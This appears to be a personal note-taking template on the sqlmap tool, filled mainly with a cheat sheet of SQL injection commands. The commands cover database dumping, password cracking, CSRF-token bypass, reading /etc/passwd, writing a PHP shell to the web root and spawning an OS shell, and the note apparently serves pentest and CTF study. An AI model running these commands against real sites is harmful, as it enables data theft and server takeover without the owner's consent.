# sqlmap

_What this tool does and when I reach for it_

## Primary Use Cases

Main things I use this tool for

## Command Patterns

### Category 1

Run `SQLMap` without asking for user input 
```bash
sqlmap -u "http://www.example.com/vuln.php?id=1" --batch
```

`SQLMap` with POST request
```bash
sqlmap 'http://www.example.com/' --data 'uid=1&name=test'
```

POST request specifying an injection point with an asterisk
```bash
sqlmap 'http://www.example.com/' --data 'uid=1*&name=test'
```

Passing an HTTP request file to `SQLMap
```bash
sqlmap -r req.txt
```

Specifying a cookie header 
```bash
sqlmap ... --cookie='PHPSESSID=ab4530f4a7d10448457fa8b0eadac29c'
```

Specifying a PUT request
```bash
sqlmap -u www.target.com --data='id=1' --method PUT
```

Store traffic to an output file
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" --batch -t /tmp/traffic.txt
```

Specify verbosity level 
```bash
sqlmap -u "http://www.target.com/vuln.php?id=1" -v 6 --batch
```

Specifying a prefix or suffix 
```bash
sqlmap -u "www.example.com/?q=test" --prefix="%'))" --suffix="-- -"
```

Specifying the level and risk
```bash
sqlmap -u www.example.com/?id=1 -v 3 --level=5
```

Basic DB enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --banner --current-user --current-db --is-dba
```

Table enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --tables -D testdb
```

Table/row enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb -C name,surname
```

Conditional enumeration 
```bash
sqlmap -u "http://www.example.com/?id=1" --dump -T users -D testdb --where="name LIKE 'f%'"
```

Database schema enumeration
```bash
sqlmap -u "http://www.example.com/?id=1" --schema
```

Searching for data 
```bash
sqlmap -u "http://www.example.com/?id=1" --search -T user
```

Password enumeration and cracking 
```bash
sqlmap -u "http://www.example.com/?id=1" --passwords --batch
```

Anti-CSRF token bypass 
```bash
sqlmap -u "http://www.example.com/" --data="id=1&csrf-token=WfF1szMUHhiokx9AHFply5L2xAOfjRkE" --csrf-token="csrf-token"
```

List all tamper scripts 
```bash
sqlmap --list-tampers
```

Check for DBA privileges
```bash
sqlmap -u "http://www.example.com/case1.php?id=1" --is-dba
```

Reading a local file
```bash
sqlmap -u "http://www.example.com/?id=1" --file-read "/etc/passwd"
```

Writing a file 
```bash
sqlmap -u "http://www.example.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"
```

Spawning an OS shell
```bash
sqlmap -u "http://www.example.com/?id=1" --os-shell
```
^sqlmap-category3

## Syntax I Forget

- Flag or option I always look up
- Parameter format I can't remember
- Output options or file formats

## When I Use This vs Alternatives

- **Use this tool when:** Specific circumstances
- **Use alternative when:** When other tools are better
- **Combines well with:** Tools that work together with this

## Personal Notes

- Things I learned from experience
- Common mistakes I made
- Environment-specific quirks

## CTF Examples

```dataview
TABLE file.name as "Box", choice(contains(file.tags, "easy"), "🟢", choice(contains(file.tags, "medium"), "🟡", "🔴")) as "Diff"
FROM "06-CTF-Writeups" AND #sqlmap
SORT file.ctime DESC
LIMIT 5
```

## Quick Links

- [[Primary-Technique]] - Main technique this supports
- [[Secondary-Technique]] - Other technique this supports

#sqlmap #tool